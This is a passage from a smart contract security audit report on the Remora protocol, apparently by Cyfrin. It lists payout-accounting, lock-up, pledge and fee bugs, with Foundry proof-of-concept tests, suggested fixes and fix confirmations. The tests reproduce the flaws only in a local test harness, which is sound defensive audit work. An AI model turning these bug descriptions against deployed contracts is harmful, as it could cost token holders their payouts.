    - so, [balance == 0 and payoutBalance() returns 0, deleteUser(forwarder) gets called](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L547-L550)
11. As a result of step 10, the payouts earned by the holder get lost

**Impact:** Forwarders can lose holders' payouts

**Proof of Concept:** Run the following test to reproduce the scenario described on the Description section.

```solidity
    function test_forwarderLosesHolderPayouts() public {
        address user1 = users[0];
        address forwarder = users[1];
        address anotherUser = users[2];

        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint);
        _whitelistAndMintTokensToUser(forwarder, amountToMint);
        // Only whitelist and allow anotherUser
        _whitelistAndMintTokensToUser(anotherUser, 0);

        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        //forwarder must have the full payout for the 5 distributions because user1 is forwarding to him
        uint256 forwarderPayoutBalance = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(forwarderPayoutBalance, payoutDistributionAmount * 5, "Forwarding payout is not working as expected");

        // forwarder claims all his payout
        vm.startPrank(forwarder);
        remoraTokenProxy.claimPayout();
        assertEq(stableCoin.balanceOf(forwarder), forwarderPayoutBalance);

        // forwarder zeros out his PropertyToken's balance
        remoraTokenProxy.transfer(anotherUser, remoraTokenProxy.balanceOf(forwarder));
        vm.stopPrank();

        assertEq(remoraTokenProxy.balanceOf(forwarder), 0);

        (bool isHolder) = remoraTokenProxy.getHolderStatus(forwarder).isHolder;
        assertEq(isHolder, false);

        // Distribute payouts for distributions 5 - 10
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint64 calculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(calculatedPayout, (payoutDistributionAmount * 5) / 2, "Forwarder did not receive payout for holder forwarding to him");

        vm.startPrank(anotherUser);
        // forwarder becomes a holder again
        remoraTokenProxy.transfer(forwarder, remoraTokenProxy.balanceOf(anotherUser));
        vm.stopPrank();

        vm.startPrank(forwarder);
        // forwarder zeroues out his balance again
        remoraTokenProxy.transfer(anotherUser, remoraTokenProxy.balanceOf(forwarder));
        vm.stopPrank();

        //@audit => When this vulnerability is fixed, we expect finalCalculatedPayout to be equals than calculatedPayout!
        (uint64 finalCalculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(finalCalculatedPayout, 0, "Forwarder did not lose payout of holder");
    }
```

**Recommended Mitigation:** In `_updateHolders()`, check `holderStatus.calculatedPayout` to be 0, if it is not 0, dont call deleteUser()
```diff
function _updateHolders(address from, address to) internal {
        ...

        if (from != address(0)) {
            ...
            HolderStatus storage fromHolderStatus = $._holderStatus[from];
-           if (fromBalance == 0 && payoutBalance(from) == 0) {
+           if (fromBalance == 0 && payoutBalance(from) == 0 && fromHolderStatus.calculatedPayout == 0) {
                deleteUser(fromHolderStatus);
                return;
            }
            ...
            }
        }
    }
```

**Remora:** Fixed in commit [d379e89](https://github.com/remora-projects/remora-smart-contracts/commit/d379e89ac7ae503f6eec775660983c7017a4a513).

**Cyfrin:** Verified.


### Pledge can't successfully complete unless `RemoraToken` is paused

**Description:** When the funding goal has been reached, `PledgeManager::checkPledgeStatus` calls `RemoraToken::unpause`:
```solidity
function checkPledgeStatus() public returns(bool pledgeNowConcluded) {
    if (pledgeRoundConcluded) return true;

    uint32 curTime = SafeCast.toUint32(block.timestamp);
    if (tokensSold >= fundingGoal) {
        pledgeRoundConcluded = true;
        IRemoraRWAToken(propertyToken).unpause();
        emit PledgeHasConcluded(curTime);
        return true;
```

But if `RemoraToken` is not paused, this [reverts](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/utils/PausableUpgradeable.sol#L128) since `PausableUpgradeable::_unpause` has the `whenPaused` modifier.

**Impact:** Pledge can't successfully complete unless `RemoraToken` is paused.

**Proof of Concept:**
```solidity
function test_pledge(uint256 userIndex, uint32 numTokensToBuy) external {
    address user = _getRandomUser(userIndex);
    numTokensToBuy = uint32(bound(numTokensToBuy, 1, DEFAULT_FUNDING_GOAL));

    // fund buyer with stablecoin
    (uint256 finalStablecoinAmount, uint256 fee)
        = pledgeManager.getCost(numTokensToBuy);
    stableCoin.transfer(user, finalStablecoinAmount);

    // fund this with remora tokens
    remoraTokenProxy.mint(address(this), numTokensToBuy);
    assertEq(remoraTokenProxy.balanceOf(address(this)), numTokensToBuy);

    // allow PledgeManager to spend our remora tokens
    remoraTokenProxy.approve(address(pledgeManager), numTokensToBuy);

    PledgeManagerState memory pre = _getState(address(this), user);

    remoraTokenProxy.pause();

    vm.startPrank(user);
    stableCoin.approve(address(pledgeManager), finalStablecoinAmount);
    pledgeManager.pledge(numTokensToBuy, bytes32(0x0), bytes(""));
    vm.stopPrank();

    PledgeManagerState memory post = _getState(address(this), user);

    // verify remora token balances
    assertEq(post.holderRemoraBal, pre.holderRemoraBal - numTokensToBuy);
    assertEq(post.buyerRemoraBal, pre.buyerRemoraBal + numTokensToBuy);

    // verify stablecoin balances
    assertEq(post.pledgeMgrStableBal, pre.pledgeMgrStableBal + finalStablecoinAmount);
    assertEq(post.buyerStableBal, pre.buyerStableBal - finalStablecoinAmount);

    // verify PledgeManager storage
    assertEq(post.pledgeMgrTokensSold, pre.pledgeMgrTokensSold + numTokensToBuy);
    assertEq(post.pledgeMgrTotalFee, pre.pledgeMgrTotalFee + fee);
    assertEq(post.pledgeMgrBuyerFee, pre.pledgeMgrBuyerFee + fee);
    assertEq(post.pledgeMgrTokensBought, pre.pledgeMgrTokensBought + numTokensToBuy);
}
```

**Recommended Mitigation:** The `RemoraToken` contract should remain in the `paused` state until the pledge completes, though this may not be convenient. Alternatively change `PledgeManager::checkPledgeStatus` to only unpause `RemoraToken` if it is paused.

**Remora:** Fixed in commit [dddde02](https://github.com/remora-projects/remora-smart-contracts/commit/dddde029b97f33bcb91d0353632a3aa5f028c684).

**Cyfrin:** Verified.


### `RemoraToken` transfers are bricked when `from` is not whitelisted, has sufficient tokens to transfer but no tokens locked

**Description:** `RemoraToken::adminTransferFrom`, `transfer` and `transferFrom` always check if `from` is on the whitelist and if not, call `_unlockTokens`:
```solidity
    bool fromWL = whitelist[from];
    bool toWL = whitelist[to];

    if (!fromWL) _unlockTokens(from, value, false);
    if (!toWL) _lockTokens(to, value);
```

But a scenario can occur where:
1) `from` has nothing to unlock
2) `from` has tokens to fulfill the transfer

In this case transfer would be bricked. Another scenario to consider is when:

1) `from` has 10 tokens
2) only 5 of those tokens are locked
3) `from` is attempting to transfer 10 tokens

In this case the call to `_unlockTokens` should have `amount = 5` since `from` only needs to unlock 5 tokens in order to send the 10 total.

But with the current code the call to `_unlockTokens` will have `amount = 10` (since it just uses the transfer amount) which makes no sense and causes a revert.

**Impact:** `RemoraToken` transfers are bricked when `from` is not whitelisted, has sufficient tokens to transfer but no tokens locked since the call to `_unlockTokens` will revert.

**Proof Of Concept:**
```solidity
function test_transferBricked_fromNotWhitelisted_ButHasTokensToTransfer() external {
    address from = users[0];
    address to = users[1];
    uint256 amountToTransfer = 1;

    // fund `from` with remora tokens
    remoraTokenProxy.mint(from, amountToTransfer);
    assertEq(remoraTokenProxy.balanceOf(from), amountToTransfer);

    // remove `from` from whitelist
    remoraTokenProxy.removeFromWhitelist(from);

    // set lock time
    remoraTokenProxy.setLockUpTime(3600);

    vm.expectRevert(); // reverts with InsufficientTokensUnlockable
    vm.prank(from);
    remoraTokenProxy.transfer(to, amountToTransfer);
}
```

This also totally bricks transfers for users who received tokens when they were whitelisted, then are removed from the whitelist:
```solidity
    function test_transferBricked_whitelistedHolderIsRemovedFromWhitelist() external {
        address from = users[0];
        address to = users[1];
        uint256 amountToTransfer = 10;

        _whitelistAndMintTokensToUser(from, amountToTransfer);

        // set lock time
        remoraTokenProxy.setLockUpTime(3600);

        // remove `from` from whitelist
        remoraTokenProxy.removeFromWhitelist(from);

        // fund `from` with remora tokens once it is not whitelisted
        remoraTokenProxy.mint(from, amountToTransfer);

        // 10 when was whitelisted and 10 when from was not whitelisted
        assertEq(remoraTokenProxy.balanceOf(from), amountToTransfer * 2);

        // forward beyond the lockup time to demonstrate the removed whitelisted holder can't do transfers
        vm.warp(3600 + 1);

        // reverts because from has only 10 tokens locked
        vm.expectRevert(); // reverts with InsufficientTokensUnlockable
        vm.prank(from);
        remoraTokenProxy.transfer(to, 11);

        // verify from can only transfer the 10 tokens that he received after he was removed from whitelist
        vm.prank(from);
        remoraTokenProxy.transfer(to, 10);
    }
```

**Recommended Mitigation:** A simple and elegant solution may be:
1) check `from` balance; if smaller than `amount` required for transfer revert
2) in transfer functions if the user is not whitelisted, calculate their `uint256 unlockedBalanceToSend = balance - getTokensLocked(sender);` then if `unlockedBalanceToSend < amount` call `_unlockTokens(sender, value - unlockedBalanceToSend..)`;

This solution only attempts to unlock the exact amount needed to fulfill a transfer, and doesn't attempt unlock if nothing to unlock or not required as the user has enough unlocked tokens to fulfill the transfer.

**Remora:** Fixed in commits [67c5e8e](https://github.com/remora-projects/remora-smart-contracts/commit/67c5e8e3262d45f38c18d295a0983dd51f5fd612), [5db7f11](https://github.com/remora-projects/remora-smart-contracts/commit/5db7f11427f6e767a6042c443d552ee9c024494b).

**Cyfrin:** Verified.


### Tokens that were locked when `lockUpTime > 0` will be impossible to unlock if `lockUpTime` is set to zero

**Description:** `LockUpManager::_unlockTokens` returns if `lockUpTime == 0`:
```solidity
function _unlockTokens(
    address holder,
    uint256 amount,
    bool disregardTime
) internal {
    LockUpStorage storage $ = _getLockUpStorage();
    uint32 lockUpTime = $._lockUpTime;
    // @audit returns if `lockUpTime == 0`
    if (lockUpTime == 0 || amount == 0) return;
```

**Impact:** Tokens that were locked when `lockUpTime > 0` will be impossible to unlock if `lockUpTime` is subsequently set to zero. Initially this won't cause any problems and users will be able to transfer tokens as normal, but if `lockUpTime` is changed to be greater than zero it will start to cause accounting-related problems as one of the protocol invariants is that the amount of tokens a user has locked should be <= to the token balance of the user.

This invariant would be violated since the lockups would still be present but the user could have transferred their tokens, causing underflow reverts in transfers when determine unlocked balance: `uint256 unlockedBalanceToSend = balance - getTokensLocked(sender);`

**Recommended Mitigation:** Even if `lockUpTime == 0`, proceed through to the `for` loop iterating over all token locks to unlock them. This maintains the  protocol invariant that the amount of tokens a user has locked is <= the user's token balance.

**Remora:** Fixed in commit [5db7f11](https://github.com/remora-projects/remora-smart-contracts/commit/5db7f11427f6e767a6042c443d552ee9c024494b).

**Cyfrin:** Verified.


### Forwarders who aren't also holders are unable to claim forwarded payouts

**Description:** Forwarders who aren't also holders are unable to claim forwarded payouts due to this check in `DividendManager::payoutBalance`:
```solidity
    function payoutBalance(address holder) public returns (uint256) {
        HolderManagementStorage storage $ = _getHolderManagementStorage();
        HolderStatus memory rHolderStatus = $._holderStatus[holder];
        uint16 currentPayoutIndex = $._currentPayoutIndex;

        if (
             // @audit must be a holder to claim payouts, prevents forwarders who aren't
             // also holders from claiming their forwarded payouts
            (!rHolderStatus.isHolder) || //non-holder calling the function
            (rHolderStatus.isFrozen && rHolderStatus.frozenIndex == 0) || //user has been frozen from the start, thus no payout
            rHolderStatus.lastPayoutIndexCalculated == currentPayoutIndex // user has already been paid out up to current payout index
        ) return 0;
```

**Impact:** Forwarders who aren't also holders are unable to claim forwarded payouts.

**Recommended Mitigation:** Remove the `(!rHolderStatus.isHolder)` check in `DividendManager::payoutBalance`.

**Remora:** Fixed in commit [82fd5d1](https://github.com/remora-projects/remora-smart-contracts/commit/82fd5d1a7d2c6c54790638d63d748eeb8efc870e).

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Use `SafeERC20` functions instead of standard `ERC20` transfer functions

**Description:** Use [`SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) functions instead of standard `ERC20` transfer functions:

```solidity
$ rg "transferFrom" && rg "transfer\("
RWAToken/DividendManager.sol
317:        $._stablecoin.transferFrom(

RWAToken/RemoraToken.sol
220:     * @dev Calls OpenZeppelin ERC20Upgradeable transferFrom function.
251:        return super.transferFrom(from, to, value);
344:            $._stablecoin.transferFrom(sender, $._wallet, _transferFee);
352:     * @dev Calls OpenZeppelin ERC20Upgradeable transferFrom function.
358:    function transferFrom(
376:            $._stablecoin.transferFrom(sender, $._wallet, _transferFee);
379:        return super.transferFrom(from, to, value);

TokenBank.sol
261:        IERC20(stablecoin).transferFrom(

PledgeManager.sol
196:        IERC20(stablecoin).transferFrom(

RemoraIntermediary.sol
172:        IERC20(data.assetReceived).transferFrom(
177:        IERC20(data.assetSold).transferFrom(
197:        IERC20(data.assetReceived).transferFrom(
238:        IERC20(data.paymentToken).transferFrom(
269:            IERC20(data.paymentToken).transferFrom(
296:        IERC20(data.paymentToken).transferFrom(
331:        IERC20(token).transferFrom(payer, recipient, amount);
RWAToken/DividendManager.sol
409:            $._stablecoin.transfer(holder, payoutAmount);
429:        stablecoin.transfer($._wallet, valueToClaim);

RWAToken/RemoraToken.sol
401:        $._stablecoin.transfer(account, burnPayout);

TokenBank.sol
185:        IERC20(tokenAddress).transfer(to, amount);
206:        if (amount != 0) IERC20(stablecoin).transfer(to, amount);
237:        IERC20(stablecoin).transfer(custodialWallet, totalValue);
266:        IERC20(tokenAddress).transfer(to, amount);

PledgeManager.sol
237:                _stablecoin.transfer(feeWallet, feeValue);
239:            _stablecoin.transfer(destinationWallet, amount);
299:        IERC20(stablecoin).transfer(signer, _fixDecimals(refundAmount + fee));
```

**Remora:** Fixed in commit [f2f3f7e](https://github.com/remora-projects/remora-smart-contracts/commit/f2f3f7e8d51a018417615207152d9fbadf8484eb).

**Cyfrin:** Verified.


### Fee refund can lose precision

**Description:** `PledgeManager::refundTokens` calculates the user fee refund as:
```solidity
fee = (userPay.fee / userPay.tokensBought) * numTokens;
```

**Impact:** The fee refund will be less than it should be due to [division before multiplication](https://dacian.me/precision-loss-errors#heading-division-before-multiplication)

**Recommended Mitigation:** Perform multiplication before division:
```solidity
fee = userPay.fee * numTokens / userPay.tokensBought;
```

**Remora:** Fixed in commit [b69836f](https://github.com/remora-projects/remora-smart-contracts/commit/b69836f4e7effd2f1cc209608b9149671c79bc18).

**Cyfrin:** Verified.


### `TokenBank::addToken` should revert if token has already been added

**Description:** `TokenBank::addToken` should revert if token has already been added.

**Impact:** Token data such as `saleAmount` and `feeAmount` will be reset to zero causing other core functions to malfunction.

**Remora:** Fixed as of latest commit 2025/07/02 though exact commit unknown.

**Cyfrin:** Verified.


### Changing stablecoin on TokenBank can mess up fees collection

**Description:** The feeAmount on each token is computed with the decimals of the current stablecoin (initially, a stablecoin of 6 decimals). If the stablecoin is changed to another one that uses decimals != than 6, if there are any pending fees before changing the stablecoin, those pending fees will then be paid with the new stablecoin, causing the actual collected money to be different than expected.

It is possible that by normal operations, a tx to buyTokens gets executed in between fees were claimed and the stablecoin is changed, if the purchased of new tokens generates fees, those new fees will be computed based on the current stablecoin, but will be paid out in the new stablecoin.
For example: if 10USDC (10e6) are as pending fees, and the new stablecoin is USDT (10e8), when those fees are collected, they will represent 0.1USDT.

```solidity
    function buyToken(
        address tokenAddress,
        uint32 amount
    ) external nonReentrant {
        ...
        uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;

        ...
        curData.feeAmount += feeValue;

        IERC20(stablecoin).transferFrom(
            to,
            address(this),
            stablecoinValue + feeValue
        );
        ...
    }

    function claimAllFees() external nonReentrant restricted {
       ...
        for (uint i = 0; i < developments.length; ++i) {
//@audit => Pending fees before stablecoin was changed were computed with the decimals of the old stablecoin
            totalValue += tokenData[developments[i]].feeAmount;
            tokenData[developments[i]].feeAmount = 0;
        }
        IERC20(stablecoin).transfer(custodialWallet, totalValue);
    }
```


**Impact:** Collected fees can be different from expected if the stablecoin is changed to a stablecoin that has different decimals than 6

**Recommended Mitigation:** Similar to how values are normalized to the decimals of the current stablecoin on the PledgeManager, implement the same logic on the TokenBank.
- Normalize the amounts of stablecoin before doing the actual transfers.

```diff
    function claimAllFees() external nonReentrant restricted {
        ...
-       IERC20(stablecoin).transfer(custodialWallet, totalValue);
+       IERC20(stablecoin).transfer(custodialWallet, _fixDecimals(totalValue));
        ...
    }

//@audit => Add this function to normalize values to decimals of the current stablecoin
    function _fixDecimals(uint256 value) internal view returns (uint256) {
        return
            stablecoinDecimals < 6
                ? value / (10 ** (6 - stablecoinDecimals))
                : value * (10 ** (stablecoinDecimals - 6));
    }
```

**Remora:** Fixed in commit [afd07fb](https://github.com/remora-projects/remora-smart-contracts/commit/afd07fb419c354dc223d0105b2fd0c5d565f465f).

**Cyfrin:** Verified.


### `TokenBank::removeToken` reverts when token balance is zero, making it impossible to remove tokens from the `developments` array

**Description:** When removing a token from the TokenBank, the removal attempt reverts if it has zero tokens on the TokenBank balance. As time passes the `developments` array will grow having unnecessary tokens inside it that are impossible to remove.

**Impact:** The `developments` array will continue to grow leading to unnecessary waste of gas when claiming fees.

**Recommended Mitigation:** Before calling `withdrawTokens()`, check if the tokenAddress' balance is 0, if so, skip the call (it would anyways revert):
```diff
    function removeToken(address tokenAddress) external restricted {
        ...
-        withdrawTokens(tokenAddress, custodialWallet, 0);
+       if(IERC20(tokenAddress).balanceOf(address(this)) > 0) withdrawTokens(tokenAddress, custodialWallet, 0);
        ...
    }
```

**Remora:** Fixed in commit [2e797fc](https://github.com/remora-projects/remora-smart-contracts/commit/2e797fc45245e3cc731e7f2f70401e8df831f1f3).

**Cyfrin:** Verified.


### Zero token transfers record receiving user as a holder in `DividendManager::HolderStatus` even if they have zero token balance

**Description:** Zero token transfers record receiving user as a holder in `DividendManager::HolderStatus` even if they have zero token balance.

**Proof of Concept:** First add these two functions in `DividendManager`:
```solidity
function getCurrentPayoutIndex() view external returns(uint8 currentPayoutIndex) {
    currentPayoutIndex = _getHolderManagementStorage()._currentPayoutIndex;
}

function getHolderStatus(address holder) view external returns(HolderStatus memory status) {
    status = _getHolderManagementStorage()._holderStatus[holder];
}
```

Then the PoC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {RemoraToken, DividendManager} from "../../../contracts/RWAToken/RemoraToken.sol";
import {Stablecoin} from "../../../contracts/ForTestingOnly/Stablecoin.sol";
import {AccessManager} from "../../../contracts/AccessManager.sol";
import {Allowlist} from "../../../contracts/Allowlist.sol";

import {UnitTestBase} from "../UnitTestBase.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract RemoraTokenTest is UnitTestBase {
    // contract being tested
    RemoraToken remoraTokenProxy;
    RemoraToken remoraTokenImpl;

    // required support contracts & variables
    Stablecoin internal stableCoin;
    AccessManager internal accessMgrProxy;
    AccessManager internal accessMgrImpl;
    Allowlist internal allowListProxy;
    Allowlist internal allowListImpl;
    address internal withdrawalWallet;
    uint32 internal constant DEFAULT_PAYOUT_FEE = 100_000; // 10%

    function setUp() public override {
        // test harness setup
        UnitTestBase.setUp();

        // support contracts / variables setup
        stableCoin = new Stablecoin("USDC", "USDC", type(uint256).max/1e6, 6);
        assertEq(stableCoin.balanceOf(address(this)), type(uint256).max/1e6*1e6);

        // contract being tested setup
        accessMgrImpl = new AccessManager();
        ERC1967Proxy proxy1 = new ERC1967Proxy(address(accessMgrImpl), "");
        accessMgrProxy = AccessManager(address(proxy1));
        accessMgrProxy.initialize(address(this));

        allowListImpl = new Allowlist();
        ERC1967Proxy proxy2 = new ERC1967Proxy(address(allowListImpl), "");
        allowListProxy = Allowlist(address(proxy2));
        allowListProxy.initialize(address(accessMgrProxy), address(this));

        withdrawalWallet = makeAddr("WITHDRAWAL_WALLET");

        // contract being tested setup
        remoraTokenImpl = new RemoraToken();
        ERC1967Proxy proxy3 = new ERC1967Proxy(address(remoraTokenImpl), "");
        remoraTokenProxy = RemoraToken(address(proxy3));
        remoraTokenProxy.initialize(
            address(this), // tokenOwner
            address(accessMgrProxy), // initialAuthority
            address(stableCoin),
            withdrawalWallet,
            address(allowListProxy),
            "REMORA",
            "REMORA",
            0
        );

        assertEq(remoraTokenProxy.authority(), address(accessMgrProxy));
    }

    function test_transferZeroTokens_RegistersHolderWithDividendManager() external {
        address user1 = users[0];
        address user2 = users[1];

        uint256 user1RemoraTokens = 1;

        // whitelist both users
        remoraTokenProxy.addToWhitelist(user1);
        assertTrue(remoraTokenProxy.isWhitelisted(user1));
        remoraTokenProxy.addToWhitelist(user2);
        assertTrue(remoraTokenProxy.isWhitelisted(user2));

        // mint user1 their tokens
        remoraTokenProxy.mint(user1, user1RemoraTokens);
        assertEq(remoraTokenProxy.balanceOf(user1), user1RemoraTokens);

        // allowlist both users
        allowListProxy.allowUser(user1, true, true, false);
        assertTrue(allowListProxy.allowed(user1));
        allowListProxy.allowUser(user2, true, true, false);
        assertTrue(allowListProxy.allowed(user2));
        assertTrue(allowListProxy.exchangeAllowed(user1, user2));

        // user1 transfers zero tokens to user2
        vm.prank(user1);
        remoraTokenProxy.transfer(user2, 0);

        // fetch user2's HoldStatus from DividendManager
        DividendManager.HolderStatus memory user2Status = remoraTokenProxy.getHolderStatus(user2);

        // user2 is listed as a holder even though they have no tokens!
        assertEq(user2Status.isHolder, true);
        assertEq(remoraTokenProxy.balanceOf(user2), 0);
    }
}
```

**Recommended Mitigation:** Either revert on zero token transfers inside `RemoraToken::_update` or change `DividendManager::_updateHolders` to not set `to` as a holder if their balance is zero.

**Remora:** Fixed in commit [0a2dea2](https://github.com/remora-projects/remora-smart-contracts/commit/0a2dea21b8dec5fa63dd2402b987b4f77c3e60b1).

**Cyfrin:** Verified.


### `DividendManager::distributePayout` records a new payout record increasing the current payout index for zero `payoutAmount`

**Description:** `DividendManager::distributePayout` records a new payout record increasing the current payout index for zero `payoutAmount`.

**Proof of Concept:**
```solidity
function test_distributePayout_ZeroPayout() external {
    // setup one user
    address user = users[0];
    uint256 userRemoraTokens = 1;

    // whitelist user
    remoraTokenProxy.addToWhitelist(user);
    assertTrue(remoraTokenProxy.isWhitelisted(user));

    // mint user their tokens
    remoraTokenProxy.mint(user, userRemoraTokens);
    assertEq(remoraTokenProxy.balanceOf(user), userRemoraTokens);

    // allowlist user
    allowListProxy.allowUser(user, true, true, false);
    assertTrue(allowListProxy.allowed(user));

    // zero payout distribution - should revert here
    remoraTokenProxy.distributePayout(0);
    // didn't revert but increased current payout index
    assertEq(remoraTokenProxy.getCurrentPayoutIndex(), 1);
}
```

**Recommended Mitigation:** `DividendManager::distributePayout` should revert when `payoutAmount == 0`.

**Remora:** Fixed in commit [c2002fb](https://github.com/remora-projects/remora-smart-contracts/commit/c2002fb751c22d6f4009eaa6f3dd651b5b4ca474).

**Cyfrin:** Verified.


### `PaymentSettler::claimAllPayouts` doesn't validate input `tokens` addresses are legitimate contracts before calling `adminClaimPayout` on them

**Description:** In `PaymentSettler::initiateBurning` and `distributePayment`, before calling any functions on the input `token` address this check occurs to ensure it is a legitimate address:
```solidity
if (!tokenData[token].active) revert InvalidTokenAddress();
```

But in `PaymentSettler::claimAllPayouts` this check does not occur:
```solidity
function claimAllPayouts(address[] calldata tokens) external nonReentrant {
    address investor = msg.sender;
    uint256 totalPayout = 0;
    for (uint i = 0; i < tokens.length; ++i) {
        TokenData storage curToken = tokenData[tokens[i]];
        uint256 amount = IRemoraToken(tokens[i]).adminClaimPayout(
            investor,
            true
        );
```

**Impact:** An attacker can deploy their own contract which implements the `adminClaimPayout` function interface but this function can contain arbitrary code; execution flow is transferred to the attacker's contract. We have not found a way to further abuse this but it isn't a good practice to allow an attacker to hijack execution flow into their own custom contracts.

**Recommended Mitigation:** Verify that the input `tokens` are valid `RemoraToken` contracts prior to calling any functions on them.

**Remora:** Fixed in commit [4ba903e](https://github.com/remora-projects/remora-smart-contracts/commit/4ba903e52438e9570940c11ae8c39acf07256b6a).

**Cyfrin:** Verified.


### Minting new PropertyTokens close to the end of the distribution period will dilute rewards for holders who were holding for the full period

**Description:** Holder's balanceHistory is updated each time a transfer of tokens occurs (mint or burn too). The [accounting saves the holders' balance during a certain index](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L533-L540), which is used to determine the payout earned from the distributed amount of stablecoin for the index.

```solidity
    function _updateHolders(address from, address to) internal {
        ...
            } else {
                // else update status data and create new entry
                tHolderStatus.mostRecentEntry = payoutIndex;
//@audit => saves the holder balance for the current payout, regardless of how much time is left for the distribution to end
                $._balanceHistory[to][payoutIndex] = TokenBalanceChange({
                    isValid: true,
                    tokenBalance: toBalance
                });
            }
        }

```

New mintings of PropertyTokens mean that the same amount of payout distributed for all holders will give less payout to each PropertyToken. The problem is that new mintings that occur close to the end of the distribution period will dilute payouts for holders who have held their PropertyTokens for the full period.

**Impact:** Holders who have held their PropertyTokens for the full distribution period will get their rewards diluted by new PropertyTokens that get minted close to the end of the period.

**Recommended Mitigation:** On the [mint()](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/RemoraToken.sol#L268-L270) calculate how much time has passed on the current distribution period, and if a certain threshold (maybe 75-80%) has passed, don't allow new mintings until the next distribution period.

**Remora:** Acknowledged.


### Forwarder can be frozen and still receive and claim payouts while frozen

**Description:** If the forwarder is frozen before the first payout then they don't receive and can't claim any payouts while frozen.

But if the forwarder is frozen after the first payout, then they do receive and can claim payouts while frozen.

**Proof of Concept:**
```solidity
function test_forwarderFrozenBeforeFirstPayout_noPayoutBalanceWhileFrozen() external {
    address user1 = users[0];
    address forwarder = users[1];
    uint256 amountToMint = 1;

    _whitelistAndMintTokensToUser(user1, amountToMint);
    _whitelistAndMintTokensToUser(forwarder, amountToMint);

    remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

    // forwarder frozen before first distribution payout
    remoraTokenProxy.freezeHolder(forwarder);

    uint64 payoutDistributionAmount = 100e6;
    _fundPayoutToPaymentSettler(payoutDistributionAmount);

    // user1 must have 0 payout because it is forwarding to `forwarder`
    uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
    assertEq(user1PayoutBalance, 0);

    // forwarder is frozen yet so receives no forwarded payout
    uint256 forwarderPayoutBalancePreUnfreeze = remoraTokenProxy.payoutBalance(forwarder);
    assertEq(forwarderPayoutBalancePreUnfreeze, 0);
}

function test_forwarderFrozenAfterFirstPayout_validPayoutBalanceWhileFrozen_claimPayoutWhileFrozen() external {
    _fundPayoutToPaymentSettler(1);

    address user1 = users[0];
    address forwarder = users[1];
    uint256 amountToMint = 1;

    _whitelistAndMintTokensToUser(user1, amountToMint);
    _whitelistAndMintTokensToUser(forwarder, amountToMint);

    remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

    remoraTokenProxy.freezeHolder(forwarder);

    uint64 payoutDistributionAmount = 100e6;
    _fundPayoutToPaymentSettler(payoutDistributionAmount);

    // user1 must have 0 payout because it is forwarding to `forwarder`
    uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
    assertEq(user1PayoutBalance, 0);

    // forwarder is frozen yet still receives forwarded payout
    uint256 forwarderPayoutBalance = remoraTokenProxy.payoutBalance(forwarder);
    assertEq(forwarderPayoutBalance, payoutDistributionAmount/2);

    // forwarder claims all their payout
    vm.prank(forwarder);
    remoraTokenProxy.claimPayout();
    assertEq(stableCoin.balanceOf(forwarder), forwarderPayoutBalance);
}
```

**Recommended Mitigation:** The mitigation depends on what the protocol wants to happen in this case, and whether it plans to mitigate L-11. If the protocol wants to allow frozen address to also serve as forwarding addresses and have a payout balance, this could be achieved by:
```diff
    function payoutBalance(address holder) public returns (uint256) {
        HolderManagementStorage storage $ = _getHolderManagementStorage();
        HolderStatus memory rHolderStatus = $._holderStatus[holder];
        uint16 currentPayoutIndex = $._currentPayoutIndex;

+       if ((rHolderStatus.isFrozen && rHolderStatus.frozenIndex == 0) && rHolderStatus.calculatedPayout > 0) return rHolderStatus.calculatedPayout;

        if (
            (!rHolderStatus.isHolder) || //non-holder calling the function
            (rHolderStatus.isFrozen && rHolderStatus.frozenIndex == 0) || //user has been frozen from the start, thus no payout
            rHolderStatus.lastPayoutIndexCalculated == currentPayoutIndex // user has already been paid out up to current payout index
        ) return 0;
```

**Remora:** Acknowledged; the forwarding mechanism is only intended to be used by Remora protocol-owned address to forward payout distributions from tokens held by the `TokenBank` and our liquidity pools. So it is unlikely that the freezing and forwarding mechanisms will ever interact.


### Forwarder can be set to frozen address

**Description:** Forwarder can be set to frozen address; this is not ideal and can result in lost tokens in a worst-case scenario.

**Proof of Concept:**
```solidity
    function test_freezeHolder_setPayoutForwardAddress_toFrozenForwarder() external {
        address user1 = users[0];
        address forwarder = users[1];
        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint);
        _whitelistAndMintTokensToUser(forwarder, amountToMint);

        // freeze forwarder
        remoraTokenProxy.freezeHolder(forwarder);

        // forward user1 payouts to frozen address
        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

        uint64 payoutDistributionAmount = 100e6;
        _fundPayoutToPaymentSettler(payoutDistributionAmount);

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
